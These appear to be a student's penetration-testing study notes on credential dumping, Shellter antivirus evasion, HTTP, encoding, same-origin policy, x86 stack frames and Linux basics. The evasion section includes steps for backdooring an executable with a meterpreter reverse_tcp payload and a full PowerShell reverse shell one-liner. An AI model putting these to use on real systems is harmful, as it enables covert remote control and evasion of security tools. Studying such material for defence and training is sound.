        > Knowing this, we can copy the NT hashes associated with each user account into a text file and start cracking passwords. It may be beneficial to make a note of each user, so we know which password is associated with which user account.

* Remote Dumping & LSA Secrets Considerations
    > With access to credentials with local admin privileges, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.
    > Dumping LSA Secrets Remotely

AV evasion with Shelter
  Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include:
    - Uninstalling/disabling security software 
    - Obfuscating/encrypting data and scripts
    - Leverage and abuse trusted processes to hide and masquerade their malware
  //We are going to try to change the signature of the malicious executable that we are generating
  AV detection methods
    1. Signature based detection: An AV signature is a unique sequence of bytes that uniquely identifies malware. As a result, you will have to ensure that your obfuscated exploit or payload doesn't match any known signature in the AV database. 
      We can bypass signature-based detection by modifying the malware's byte sequence, therefore changing the signature
    2. Heuristic-based detection: Relies on rules or decisions to determine whether a binary is malicious. It also looks for specific patterns within the code or program calls
    3. Behavior based detection: Relies on identifying malware by monitoring it's behavior. Used for newer strains of malware
  AV evasion techniques
    On-disk evasion techniques
      1.  Obfuscation: Obfuscation relies to the process of concealing something important, valuable or critical. It reorganizes code in order to make it harder to analyze or RE
      2.  Encoding: Encoding data is a process involving changing data into a new format using a scheme. Encoding is a reversible process; data can be encoded to a new format and decoded to its original format
      3.  Packing: Generate executable with the new binary structure with a smaller size and therefore provides the payload with a new signature
      4.  Crypters: Encrypts code or payloads and decrypts the encrypted code in memory. The decryption key/function is usually stored in a stub
    In-Memory evasion techniques
      1.  Focuses on manipulation of memory and does not write files to disk
      2.  Injects payload into a process by leveraging various Windows APIs
      3.  Payload is then executed in memory in a separate thread
  Usage of shellter
    https://www.shellterproject.com/introducing-shellter/
    apt-get install shellter -y
    //We also need to install wine 32-bit package because shellter only supports any 32-bit payload (generated either by metasploit or custom ones by the user).
    dpkg --add-architecture i386
    apt-get install wine32
    //We could use the vncviewer.exe 
    cp /usr/share/windows-binaries/vncviewer.exe /home/kali/Desktop/AVBypass
    cd /usr/share/windows-resources/shellter
    sudo wine shellter.exe
      Auto mode
      /home/kali/Desktop/AVBypass/vncviewer.exe
      //Shellter will trace a random number of instructions 
      Enable Stealth Mode? Yes //If you want that executable work as intended.
      Payload? Listed payload 
      set lhost
      set lport
      msfconsole -q
        use multi/handler
        set payload windows/meterpreter/reverse_tcp
      python3 -m http.server 80
        //Execute it in the Windows machine 
  Obfuscating Powershell code
    git clone https://github.com/danielbohannon/Invoke-Obfuscation
    Use a reverse shell in powershell and save it as shell.ps1
      powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Basics
  HTTP protocol basics
    Format of an HTTP message is
      HEADERS\r\n
      \r\n

      MESSAGE BODY\r\n

      \r(Carriage Return): moves the cursor to the beginning of the line
      \n(Line Feed): moves the cursor down to the next line
      \r\n: Is the same of hitting enter on your keyboard


    Note that a connection to www.google.com on port 80 is initiated before sending HTTP commands to the webserver
    HTTP Request:
      HTTP/1.1 ==> This is the HTTP protocol version that your browser wants to talk with. This basically informs the web server about which version of HTTP you would like to use in any further communication
      Host ==> It allows a web server to host multiple websites at a single IP address.
      Host value ==> Host value + Path combine to create the full URL you are requesting: the home page of www.google.com/
      User-Agent ==> Reveals your browser version, operating system and language to the remote web server
      Accept ==> Used by your browser to specify which document type is expected to be returned as a result of this request
      Accept-Encoding ==> Similar to accept, but it restricts the content codings that are acceptable in the response. Content codings are primarily used to allow a document to be compressed or transformed without losing the identity of its media type and without loss of information
      Connection ==> With HTTP 1.1 you can keep your connection to the remote web server open for an unspecified amount of time using the value "keep-alive". This indicates that all requests to the web server will continue to be sent through this connection without initiating a new connection every time (as in HTTP 1.0)

    HTTP response
      Date: Represents the date and time at which the message was originated
      Cache-Control: Allows the browser and the server to agree about caching rules. Cached contents save bandwidth because, in short, they prevent your browser from re-requesting contents that have not changed when the same resource is to be used.
      Content-Type: Lets the client know how to interpret the body of the message
      Content-Encoding: "gzip" Extends Content-Type. In this case the message body is compressed with gzip
      Server: "gws". Displays the web server banner. Apache and IIS are common web servers. Google uses this custom webserver banner (Google Web Server)
      Content-Length: Indicates the length, in bytes, of the message body
      
  Encoding
    Internet users, via their web browsers, request billions of pages every day. All of the content of these pages are displayed according to a charset. But what is a character set? It contains a set of characters: they represent the set of all symbols(What the user reads as he sees it on the screen) and code points(Numeric index, used to distinguish, unambiguosly, the symbol within the charset) that the end user can display in their browser window. //A symbol can be shown only if it exists in the charset. Examples of charsets are: ASCII(https://www.ascii-code.com/), Unicode(https://unicode-table.com/en/#0032)/UTF-8, UTF-16 and UTF-32(The numbers are the amount of bits used to represent code points), Latin-1 and so on

    HTML4 ==> <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"> //ISO-8859-1: "8-bit single-byte coded graphic character sets" aka Latin 1
    HTML5 ==> <meta charset="UTF-8">
    
    If you want to show symbols (like < > ) in your web document and you want to avoid the symbols being interpreted by your browser as HTML language elements, then you need to use the related entities(It is not a really security feature however, its use can limit most client side attacks. An HTML entity is simply a string (starting with & or &# and ending with ;) that corresponds with a symbol. When the browser encounters an entity in an HTML page it will show the symbol to the user and will not ever interpret the symbol as an HTML language element
    Character Reference       Rule                                            Encoded character

                                H = an hexadecimal number (case-insensitive)  &#X3C;

    URL encoding(percent encoding)
      URLs sent over the Internet must contain characters in the range of the US-ASCII code character set. If unsafe characters are present in a URL, encoding theme is required. 
      This encoding is important because it limits the characters to be used in a URL to a subset of specific characters:
        1. Unreserver chars: [a-zA-Z] [0-9] [-._~]
        2. Reserved chars (they have a specific purpose): :/?#[]@!$&"()*+,;=%·
      Other characters are encoded by the use of a percent char (%) plus two hexadecimal digits. Reserved chars must be encoded when they have no special role inside the URL. A list of common encoded characters(https://www.w3schools.com/tags/ref_urlencode.asp)
        Character   Purpose in URI          Encoding
        #           Separate anchors        %23
        ?           Separate query string   %3F
        &           Separate query elements %26
        +           Indicates a space       %2B

    Base64 
      Is a binary-to-text encoding schema used to convert binary files and send them over Internet. For example, the e-mail protocol makes massive use of this encoding to attach files to messages. The HTML language permits the inclusion of some resources by using this encoding. For example, an image can be included in a page by inserting its binary content that has been converted to base64
      The alphabet of the Base64 encoding scheme is composed of:
        digits ==> [0-9]
        latin letters ==> [a-zA-Z] 
        + and /

  Same Origin Policy(SOP)
    This policy prevents a script or a document from getting or setting properties of another document that comes from a different origin. The primary purpose of SOP is to isolate requests coming from different origins.
    The main rule of SOP is:
      "A document(HTML page, an iframe included in the main page or a response to an Ajax request) can access (through JavaScript) the properties of another document only if they have the same origin" //More precisely, the browser always performs the request successfully but it returns the response to the user only if the SOP is respected.
    CSS stylesheets(*.css), images and scripts(*.js) are loaded by the browser without consulting the policy. SOP is consulted when cross-site HTTP requests are inititated from within client side scripts (IE: JavaScript), or when an Ajax request is run.
    The origin is defined by the following triplet:
      Protocol + Host + Port ==> http://www.elswapt.site
    Other example ==> http://els.wapt.site/index.php
      SOP OK ==> http://els.wapt.site/admin/index.php ==> Same protocol, host and port
      SOP not OK ==>  https://els.wapt.site/index.php ==> Different protocol
    Content from ... inherits the origin
      about:blank
      javascript:
      data: 
    !Internet explorer works a bit differently from other browsers. It has two exceptions:
      · Port: It does not consider the port as a Same Origin component
      · Trust zone: The same Origin is not applied to domains that are in highly trusted zone (i.e. corporate domains)
    What would it happen if SOP did not exist?

      Suppose you are logged in to your bank site and suppose your friend invites you to visit his new website. Your evil friend could build a crafted page, instigate you to visit it and once visited by you, access(some) personal information from your bank account
    Example 
      Let us suppose that index.html on domain a.elswapt.site (referred to as origin1: http://a.elswapt.site) wants to access via an Ajax request(hxr) the home.html page on domain b.elswapt.site (referred to as origin2: http://b.elswapt.site). 
      The document index.html on domain a.elswapt.site cannot access via an Ajax request (xhr) the home.html page on domain b.elswapt.site

Architecture fundamentals
CPU, ISA and Assembly
 	> CPU (Central Process Unit): Is the device in charge of executing the machine code of a program
 	> Machine code (= machine language): Set of instructions that the CPU processes. Each instruction is a primitive command that executes a specific operation such as move data, changes the execution flow of the program, perform arithmetic or logic operations and others. CPU instructions are represented in hexadecimal. Therefore, the same machine code gets translated into mnemonic code (a more readable language); this is called the assembly language (ASM). The assembler we are going to use is NASM
 	> Each CPU has its own instruction set architecture (ISA) that a programmer (or a compiler) must understand and use to write a program correctly for that specific CPU and machine. One of the most common ISA is the x86 instruction set from the Intel 8086. The x86 acronym identifies 32-bit processors, while x64(aka x86_64 or AMD64) identifies the 64-bit versions. 

Registers
	> The number of bits, 32 or 64, refers to the width of the CPU registers. Each CPU has its fixed set of registers that are accessed when required. You can think of registers as temporary variables used by the CPU to get and store data.
	> Although almost all registers are small portions of memory in the CPU and serve to store data temporarily, it is important to know that some of them have specific functions, while some others are used for general data storage. We will focus on a specific group of registers: The General Purpose Registers (GPRs)
	> 8 general purpose registers to the x86 architecture
	EAX => Accumulator 	==> Used in arithmetic operation
	ECX => Counter 		==> Used in shift/rotate instruction and loops
	EDX => Data 		==> Used in arithmetic operation and I/0
	EBX => Base		==> Used as a pointer to data
	ESP => Stack Pointer	==> Pointer to the top of the stack
	EBP => Base Pointer 	==> Pointer to the base of the stack (aka Stack Base Pointer or Frame pointer)
	ESI => Source Index	==> Used as a pointer to a source in stream operation
	EDI => Destination 	==> Used as a pointer to a destination in stream operation
	> The naming convention of the old 8-bit CPU had 16-bit register divided into two parts:
		- A low byte, identified by an L at the end of the name 
		- A high byte, identified by an H a the end of the name
		For example: AH|AL, CH|CL, DH|DL, BH|BL, SPL, BPL, SIL and DIL
	> The 16-bit naming convention combines the L and the H and replaces it with an X. While for Stack Pointer, Base Pointer, Source and Destination registers it simply removes the L
		For example: AX, CX, DX, BX, SP, BP, SI and DI
	> In the 32-bit representation, the register acronym is prefixed with an E, meaning extended
	> In the 64-bit representation, the E is replaced with the R
	> Another important register , the EIP (x86 naming convention). It controls the program execution by storing a pointer to the address of the next instruction (machine code) that will be executed. It tells the CPU where the next instruction is.

Process Memory
The process is divided into four regions: Text, Data, the Heap and the Stack
	> The Text region, or instruction segment, is fixed by the program and contains the program code (instructions). This region is marked as read-only since the program should not change during execution
	> The Data region is divided into initialized data and uninitialized data. Initialized data includes items such as static and global declared variables that are pre-defined and can be modified. 
		+ The unintialized data, named Block Started by Symbol(BSS) also initializes variables thata are initialized to zero or do not have explicit initialization(ex. static int t)
	> Next is the Heap, which starts right after the BSS segment. During the execution, the program can request more space in memory via 'brk' and 'sbrk' system calls, used by 'malloc', 'realloc' and 'free'. Hence, the size of the data region can be extended.
	> The last region of the memory is the Stack.

The Stack
· The Stack is a Last-in-First-out (LIFO) block of memory. It is located in the higher part of the memory. You can think of the stack as an array used for saving a function's return addresses, passing function arguments and storing variables. The purpose of the ESP register(Stack Pointer) is to identify the top of the stack and it is modified each time a value is pushed in (PUSH) or popped out (POP)
· The stack grows downwards, towards the lower memory addresses
· The Heap would start from lower addresses and grow upwards and the Stack would start from the end of the memory and grow downward.
· The first example of how the stack changes is the execution of the following instruction: PUSH E
· The second example is the execution of the following instruction: POP E
	PUSH Instruction
	· A PUSH instruction subtracts 4(in 32-bit) or 8(in 64-bit) from the ESP and writes the data to the memory address in the ESP and then updates the ESP to the top of the stack. Remember that the Stack grows backward. Therefore the PUSH subtracts 4 or 8 in order to point to a lower memory location on the stack. If we do not subtract it, the PUSH operation will overwrite the current location pointed by ESP (the top) and we would lose data.
	> The ESP points to the top of the stack -4
		ESP	A	==> PUSH (E) ==>	E 	ESP-4
			B				A
			C				B
			D				C
							D
	> A more detailed example of the PUSH instruction
 		+ Starting value (ESP contains the address value): ESP points to the following memory address: 0x0028FF80
		+ Process: The program executes the instruction PUSH 1. ESP decreases by 4, becoming 0x0028FF7C and the value 1 will be pushed on the stack
				      ...	==> PUSH 1 ==>	ESP = 0x0028FF7C ==> 00000001
		ESP = 0x0028FF80 => ..data..					     ..data..
				    ..data..					     ..data..
				    ..data..					     ..data..
	POP Instruction
	 POP PROCESS
	 · A POP is executed and the ESP register is modified
	 STARTING VALUE
	 · The ESP points to the top of the stack (Previous ESP +4)
	 PROCESS
	 · The POP operation is the opposite of PUSH and it retrieves data from the top of the Stack. Therefore, the data contained at the address location in ESP (the top of the stack) is retrieved and stored (usually in another register). After a POP operation, the ESP value is incremented in x86 by 4 or in x64 by 8.
	ENDING VALUE
 	> The ESP points to the top of the stack +4. (Same as the previous location before the PUSH)
 		ESP	E	==> POP (E) ==>		A 	ESP+4
 			A				B
 			B				C
 			C				D
 			D       			

	> A more detailed example of the POP instruction
 		+ Starting value (ESP contains the address value): After the PUSH 1 the ESP points to the following memory address: 0x0028FF7C
		+ Process: The program executes the instruction POP EAX. The value (00000001) contained at the address of the ESP (0x0028FF7C = the top of the Stack) will be popped out from the stack and will be copied in the EAX register. Then, ESP is updated by adding 4 and becoming 0x0028FF80.

										     00000001
		ESP = 0x0028FF7C => 00000001	==> POP EAX ==>	ESP = 0x0028FF80 ==> ..data.. 
		 	            ..data..					     ..data..
				    ..data..					     ..data..
				    ..data..
	Procedures and functions
	 > It is important to understand thtat the value popped from the stack is not deleted (or zeroed). It will stay in the stack until another instruction overwrites it.

· Now that we know more about the Stack, we will investigate how procedures and functions work. It is important to know that procedures and functions alter the normal flow of the process. When a procedure or a function terminates, it returns control to the statement or instruction that called the function.	

· Stack Frames
 > Functions contain two important components
  - Prologue: Prepares the stack to be used 
  - Epilogue: When the function has completed, the epilogue resets the stack to the prologue settings.
 > The Stack consists of logical stack frames (portions/areas of the Stack) that are PUSHed when calling a functions and POPped when returning a value.
 > When a subroutine, such as a function or procedure, is started, a stack frame is created and assigned to the current ESP location (top of the stack); this allows the subroutine to operate independently in its own location in the stack.
 > When the subroutine ends, 2 things happen:
  1. The program receives the parameters passed from the subroutine.
  2. The Instruction Pointer (EIP) is reset to the location at the time of the initial call.
  * In other words, the stack frame keeps track of the location where each subroutine should return the control when it terminates.
 > This process has tree main operations:
  1. When a function is called, the arguments [(in brackets)] need to be evaluated
  2. The control flow jumps to the body of the function and the program executes its code
  3. Once the function ends, a return statement is encountered, the program returns to the function call (the next statement in the code).
  # Example in C
  int b(){ //function b
          return 0;
  }
  int a(){ //function a
          b();
          return 0;
  }
  int main(){ //main function
          a();
          return 0;
  }
  ## Explanation
  #Higher memory address(To upwards)Lower memory address.
  · Step 1:
  	+ The entry point of the program is main()
	+ The first stack frame that needs to be pushed to the Stack is the main() stack frame. Once initialized, the stack pointer is set to the top of the stack and a new main() stack frame is created.
  · Step 2:
  	+ Once inside main(), the first instruction that executes is a call to the function named a(). Once again, the stack pointer is set to the top of the stack of main() and a new stack frame for a () is created on the stack.
  · Step 3:
  	+ Once the function a() starts, the first instruction is a call to the function named b(). Here again, the stack pointer is set and a new stack frame for b() will be pushed on the top of the stack.
  · Step 4:
  	+ The function b() does nothing and just returns. When the function completes, the stack pointer is moved to its previous location and the program returns to the stack frame of a() and continues with the next instruction.
  · Step 5:
  	+ The next instruction executed is the return statement contained in a(). The a() stack frame is popped, the stack pointer is reset and we will get back in the main() stack frame.
  ## Another example related with Buffer Overflow.
  void functest(int a, int b, int c)  {
          int test1 = 55;
          int test2 = 56;
  }
  int main(int argc, char * argv[]) {
          int x = 11;
          int z = 12;
          int y = 13;
          functest(30,31,32);
          return 0;
  }
  ##Explanation
  · Step 1:
  	+ When the program starts, the function main() parameters (argc, argv) will be pushed on the stack from right to left. 
		argc
		argv
		...
  · Step 2:	
	+ CALL the function main(). Then, the processor PUSHes the content of the EIP(Instruction Pointer) to the stack and points to the first byte after the CALL instruction.
	+ This process is important because we need to know the address of the next instruction in order to proceed when we return from the function called.
  · Step 3:
  	+ The caller (the instruction that executes the function calls - the OS in this case) loses its control and the calle (the function that is called - the main function) takes control.
		old EIP  //Return address from main(). The next instruction to execute once we return from main.
		argc
		argv
		...
  · Step 4:
  	+ Now that we are in the main() function, a new stack frame needs to be created. The stack frame is defined by the EBP (Base Pointer) and the ESP (Stack pointer). Because we don't want to lose the old stack frame information, we have to save the current EBP on the Stack. If we did not do tis, when we returned, we will not know that this information belonged to the previous stack frame, the function that called main(). Once its value is stored , the EBP is updated and it points to the top of the stack
		old EBP //Contains the base pointer of the caller. At this time, both EBP and ESP points at the 
		old EIP   |
		argc	  |	Old stack frame
		argv      |
		...       | 
 · Prologue
 	It is a sequence of instructions that take place at the beginning of a function. This will occur for all functions. Once the callee gets the control, it will execute the following instructions:
	1 push ebp
	2 mov ebp, esp
	3 sub esp, X // X is a number
	
	##Explanation
	The first instruction(push ebp) saves the old base pointer onto the stack,so it can be restored later on when the function returns.
	EBP is currently pointing to the location of the top of the previous stack frame.
	----
	The second instruction (mov ebp, esp) copies the value of the Stack pointer (ESP - top of the stack) into the base pointer (EBP); this creates a new stack frame on top of the Stack.
	 + The base of the new stack frame is on top of the old stack frame
	 + Important: Notice that in assembly, the second operand of the instruction (esp in this case) is the source, while the first operand (ebp in this case) is the destination. Hence, esp is moved into ebp.
		
	The last instruction (sub esp, X) moves the Stack Pointer (top of the stack) by decreasing its value, this is necessary to make space for the local variables.
	 + Similar to the previous instruction, X is the source and esp is the destination. Therefore, the instruction subtracts X from esp (this X is not the int variable X from the program)
	 + The third instruction creates enough space in the stack to copy local variables. Variables are allocated by decreasing the stack pointer (top of the stack) by the amount of space required.
	 + Remember that the stack grows backward. Therefore, we have to decrease its value to expand the stack frame
	
	 + This represents the Stack once the prologue has happened.
	   Lower memory address					     <= [ESP-X]
	   	To			...
	   	[Upward]		EBP-8
	   	From			EBP-4	
	   Higher memory address	EBP+0	old EBP (caller EBP) <= EBP
	   				EBP+4	old EIP
	   				EBP+8	argc	
	   				...	argv
	   					...
	 	=> Notice that since the main function contains other variables and a function call, the actual stack frame for the main() subroutine is slightly bigger.
	 + Once the prologue ends, the stack frame for main() is complete and the local variables are copied to the stack. Since ESP is not pointing to the memory address right after EBP, we cannot use the PUSH operation, since PUSH stores the value on top of the stack (the addresss pointed by ESP).
	 + The variable is a hexadecimal value that is an offset from the base pointer (EBP) or the stack pointer (ESP)
	 + The instructions after the prologue are like the following:
	 	MOV DWORD PTR SS:[ESP+Y],0B
		> This instruction means: move the value 0B (hexadecimal of 11 - the first local variable) into the memory address location pointed at ESP+Y. Note that Y is a number and ESP+Y points to a memory address between EBP and ESP.
	 + This process will repeat through all the variables and once the process completes, the stack will look like the following

	   Lower memory address					     <= ESP
	   	To			...	13 (y)
	   	[Upward]		EBP-8	12 (z)
	   	From			EBP-4	11 (x)		     <= [ESP+Y]
	   Higher memory address	EBP+0	old EBP (caller EBP) <= EBP
	   				EBP+4	old EIP
	   				EBP+8	argc	
	   				...	argv
	   					...
	 + Then the main() continues executing its instructions.

  · Step 5
  	+ The next instruction calls the function functest().
	+ The whole process will be executed again. This time a new stack frame will be created for the function functest().
	The process looks like the following:
		> PUSH the function parameters in the stack
		> Call the function functest()
		> Execute the prologue (which will update EBP and ESP to create the new stack frame)
		> Allocate local variables onto the stack.
	+ The following is how the stack looks like at the end of the entire process.
		Functest Stack Frame	56		<- ESP
					55
					Old EBP (main)  <- EBP
		Main Stack Frame	old EIP
					30
					31
					32
					...
					13(y)
					12(z)
					11(x)
					old EBP
		OS Stack Frame		old EIP
					argc 
					argv
					...

1.2.4.6 Epilogue
 + We have seen how the stack frames are created. Now, we have to understand how they are destroyed. What happens when the code executes a return statement and the control goes back to the previous procedure (and stack frame)?
 + When the program enters a function, the prologue is executed to create the new stack frame
 + When the program executes a return statement, the previous stack frame is restored thanks to the epilogue.
 + The operations executed by the epilogue are the following:
 	 · Return the control to the caller
	 · Replace the stack pointer with the current base pointer. It restores its value to before the prologue; this is done by POPping the base pointer from the stack.
	 · Returns to the caller by POPping the instruction pointer from the stack (stored in the stack) and then it jumps to it.
 + The following code represents the epilogue:
 	leave 
	ret
 + The instructions can also be written as follows:
 	mov esp, ebp
	pop ebp
	ret
 + This is what happens to the previous stack when the function functest() ends. Notice that even if the code does not contain a return, when the program leaves a subroutine it will still run the epilogue.
					...
		Main Stack Frame ESP ->	Old EBP (main)  <- EBP
					old EIP
					30
					31
					32
					...
					13(y)
					12(z)
					11(x)
					old EBP
		OS Stack Frame		old EIP
					argc 
					argv
					...
 + The first instruction in the epilogue is mov esp, ebp. After it gets executed; both ESP and EBP point to the same location.
 + The next instruction is pop ebp, which simply POPS the value from the top of the stack into EBP. Since the top of the Stack points to the memory address location where the old EBP is stored (the EBP of the caller), the caller stack frame is restored.
 + It is important to know that a POP operation automatically updates the ESP (same as the PUSH).
 + Therefore, ESP now points to the old EIP previously stored
					...
					Old EBP (main)  
		Main Stack Frame	old EIP		<- ESP
					30
					31
					32
					...
					13(y)
					12(z)
					11(x)
					old EBP 	<- EBP
		OS Stack Frame		old EIP
					argc 
					argv
					...
 + The last instruction that the epilogue will execute is ret. RET pops the value contained at the top of the stack to the old EIP - the next instruction after the caller and jumps to that location. This gives control back to the caller. RET affects only the EIP and the ESP registers.

1.2.5 Endianness
 + Endianness is the way of representing (storing) values in memory.
 + Even though there are three types of endianness, we will explain only two of them, the most important ones: big-endian and little-endian.
 > First, it is important to know these two concepts:
 	· The most significant bit (MSB) in a binary number is the largest value, usually the first from the left. So, for example, considering the binary number 100 the MSB is 1.
	· The least significant bit (LSB) in a binary number is the lowest value, usually the first from the right. So, for example, considering the binary number 110 the LSB is 0.
 + In the big-endian representation, the least significant byte (LSB) is stored at the highest memory address. While the most significant byte (MSB) is at the lowest memory address.
 	· Example: the 0x12345678 value is represented as:
		Highest memory	Address in memory	Byte value
				+0			0x12
				+1			0x34
				+2			0x56
		Lowest memory	+3			0x78
 + Respectively, in the little-endian representation, the least significant byte (LSB) is stored at the lower memory address, while the most significant byte is at the highest memory address. 
 	· Example: the 0x12345678 is represented in memory as:
		Highest memory	Address in memory	Byte value
				+0			0x78
				+1			0x56
				+2			0x34
		Lowest memory	+3			0x12
 + Here's another example. Let us consider the value 11 (0B in hexadecimal). The example system is using little-endian representation; therefore, the LSB is stored in the lower memory address or MSB is stored at the highest memory address.
 + Using the previous table, we will have the following
		Highest memory	Address in memory	Byte value
				+0			0x0B
				+1			0x00
				+2			0x00
		Lowest memory	+3			0x00
 + Remember that the most significant byte is stored at the highest memory address and since the stack grows backward (towards lower addresses), the most significant byte (0B in this case) will be stored on the "left" (0028FEBF - the highest memory address)

1.2.6 NOPs
+ Another important topic is the No Operation instruction (NOP)
+ NOP is an assembly language instruction that does nothing. When the program encounters a NOP, it will simply skip to the next instruction. In Intel x86 CPUs, NOP instructions are represented with the hexadecimal value 0x90
+ NOP-sled is a technique used during the exploitation process of Buffer Overflows. Its only purpose is to fill a large (or small) portion of the stack with NOPs; this will allow us to slide down to the instruction we want to execute, which is usually put after the NOP-sled.
+ The reason is because Buffer Overflows have to match a specific size and location that the program is expecting.

	Aside from the assessment type, client name, address, and key personnel contact information, some other critical pieces of information include:
		
	How many expected live hosts? 	
	How many IPs/CIDR ranges in scope? 	
	How many Domains/Subdomains are in scope? 	
	How many wireless SSIDs in scope? 	
	How many web/mobile applications? If testing is authenticated, how many roles (standard user, admin, etc.)? 	
	For a phishing assessment, how many users will be targeted? Will the client provide a list, or we will be required to gather this list via OSINT? 	
	If the client is requesting a Physical Assessment, how many locations? If multiple sites are in-scope, are they geographically dispersed? 	
	What is the objective of the Red Team Assessment? Are any activities (such as phishing or physical security attacks) out of scope? 	
	Is a separate Active Directory Security Assessment desired? 	
	Will network testing be conducted from an anonymous user on the network or a standard domain user? 	
	Do we need to bypass Network Access Control (NAC)?

    Most Linux distributions have now switched to systemd. This daemon is an Init process started first and thus has the process ID (PID) 1. This daemon monitors and takes care of the orderly starting and stopping of other services. All processes have an assigned PID that can be viewed under /proc/ with the corresponding number. Such a process can have a parent process ID (PPID), known as the child process.
    Besides systemctl we can also use update-rc.d to manage SysV init script links. Let us have a look at some examples
        systemctl enable ssh
    systemctl list-units --type=service //list all services

    3	SIGQUIT - Sent when a user presses [Ctrl] + D to quit.
    9	SIGKILL - Immediately kill a process with no clean-up operations.
    15	SIGTERM - Program termination.
    19	SIGSTOP - Stop the program. It cannot be handled anymore.
    20	SIGTSTP - Sent when a user presses [Ctrl] + Z to request for a service to suspend and they will not be executed further. To keep it running in the background, we have to enter the command bg to put the process in the background.

| `updatedb` | Updates the locale database for existing contents on the system. |
| `locate` | Uses the locale database to find contents on the system. | 
| `more` | Pager that is used to read STDOUT or files. |

Path	Description
/	    The top-level directory is the root filesystem and contains all of the files required to boot the operating system before other filesystems are mounted as well as the files required to boot the other filesystems. After boot, all of the other filesystems are mounted at standard mount points as subdirectories of the root.
/bin	Contains essential command binaries.
/boot	Consists of the static bootloader, kernel executable, and files required to boot the Linux OS.
/dev	Contains device files to facilitate access to every hardware device attached to the system.
/etc	Local system configuration files. Configuration files for installed applications may be saved here as well.
/home	Each user on the system has a subdirectory here for storage.
/lib	Shared library files that are required for system boot.
/media	External removable media devices such as USB drives are mounted here.
/mnt	Temporary mount point for regular filesystems.
/opt	Optional files such as third-party tools can be saved here.
/root	The home directory for the root user.
/sbin	This directory contains executables used for system administration (binary system files).
/tmp	The operating system and many programs use this directory to store temporary files. This directory is generally cleared upon system boot and may be deleted at other times without any warning.
/usr	Contains executables, libraries, man files, etc.
/var	This directory contains variable data files such as log files, email in-boxes, web application related files, cron files, and more.

Working with Web Services
 For an Apache web server, we can use appropriate modules, which can encrypt the communication between browser and web server (mod_ssl), use as a proxy server (mod_proxy), or perform complex manipulations of HTTP header data (mod_headers) and URLs (mod_rewrite).

Navigation
  cd - //Jump back to the directory we were last in

Redirect STDIN Stream to a File
  We can also use the double lower-than characters (<<) to add our standard input through a stream. We can use the so-called End-Of-File (EOF) function of a Linux system file, which defines the input's end
  cat << EOF > stream.txt

An option for further locking down Linux systems is Security-Enhanced Linux (SELinux) or AppArmor. This is a kernel security module that can be used for security access control policies. In SELinux, every process, file, directory, and system object is given a label. Policy rules are created to control access between these labeled processes and objects and are enforced by the kernel. This means that access can be set up to control which users and applications can access which resources. SELinux provides very granular access controls, such as specifying who can append to a file or move it. Besides, there are different applications and services such as Snort, chkrootkit, rkhunter, Lynis, and others that can contribute to Linux's security.

	-size: -n/+n/n can be used, where n is a number. To specify a size, you also need a sufix. c=bytes, k=KB and M=MBs. Example: If you want to specify a size less than 30 bytes, the argument -30c should be used
	-perm: To specify permissions.
		You can use - prefix to return files with at least the permissions you specify. This means that the -444 mode will match files that are readable by everyone, even if someone also has write and/or execute permissions.
		Using the / prefix will return files that match any of the permissions you have set. This means that the /666 mode will match files that are readable and writeable by at least one of the groups(owner,group or others)
	-a,m,c with min(for minutes) and time(days).
		-a:accesed
		-m:modified
		-c:changed
		Example:
		A file accesed more than 30 minutes ago: -amin +30
		Modified less than 7 days ago: -mtime -7
		A file modified within the last 24 hours: -mtime 0
	-exec: Example: -exec whoami \;

wget: Allows us to download files from the web via HTTP--as if you were accessing the file in your browser
SCP: Unlike the regular cp command, this command allows you to transfer files between two computers using the SSH protocol to provide both authentication and encryption
	To copy an example file from our machine to a remote machine	scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt
	To copy a file from a remote computer that we are not logged into:	scp ubuntu@192.168.1.30:/home/ubuntu/documents.txt notes.txt
python3 -m http.server: One flaw with this module is that you have no way of indexing, so you must know the exact name and location of the file that you wish to use.
	And alternative is updog(pip3 install updog)
Viewing processes:
	ps aux: To see the processes run by other users and those that don't run from a session(i.e. system processes)
	top
	kill: Below are some of the signals that we can send to a process when it is killed
		SIGTERM: Kill the process, but allow it to do some cleanup tasks beforehand
		SIGKILL: Kill the process - doesn't do any cleanup after the fact
		SIGSTOP: Stop/suspend a process
	Once a system boots and it initialises, systemd is one of the first processes that are started. Any program or piece of software that we want to start will start as what's known as a child process of systemd. This means that it is controlled by systemd, but will run as its own process(although sharing the resources from systemd) to make it easier for us to identify and the likes.
	We can do four options with systemctl(This command allows us to interact with the systemd process/daemon)
		Start
		Stop
		Enable
		Disable
	When excuting things like scripts --rather than relying on the & operator, we can use ctrl + z on our keyboard to background a process.
	fg: To bring the background process back into use on the terminal, where the output of the script is now returned to use

crontabs: One of the processes that is started during boot, which is responsible for facilitating and managing cron jobs. It is simply a special file with formatting that is recognised by the cron. It requires 6 specific values:
	MIN: What minute to execute at
	HOUR: What hour to execute at
	DOM: What day of the month to execute at
	MON: What month of the year to execute at
	DOW: What day of the week to execute at
	CMD: The actual command that will be executed

	Example: 0 *12 * * * cp -R /home/andres/Documents /var/backups/
	crontab -e: Crontabs can be edited

package management:
	add-apt-repository. Whilst you can install software through the use of package installers such as dpkg. The benefits os apt means that whenever we update our system, the repository that contains the pieces of software that we add also gets checked for updates
	When adding software, the integrity of what we download is guaranteed by the use of what is called GPG(Gnu Privacy Guard) keys.
	Example:
		wget -qo - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -
		A good practice is to have a separate file for every different community/3rd party repository that we add
			in /etc/apt/sources.list.d touch sublime-text.list
			nano sublime-text.list
			deb https://download.sublimetext.com/ apt/stable/
		apt update: After that, we need to update apt to recognise this new entry
		apt install sublime-text
		add-apt-repository --remove  and after apt remove sublime-text: To remove packages

    Core windows processes
        Tools better than taskmgr.exe: Process hacker and process explorer
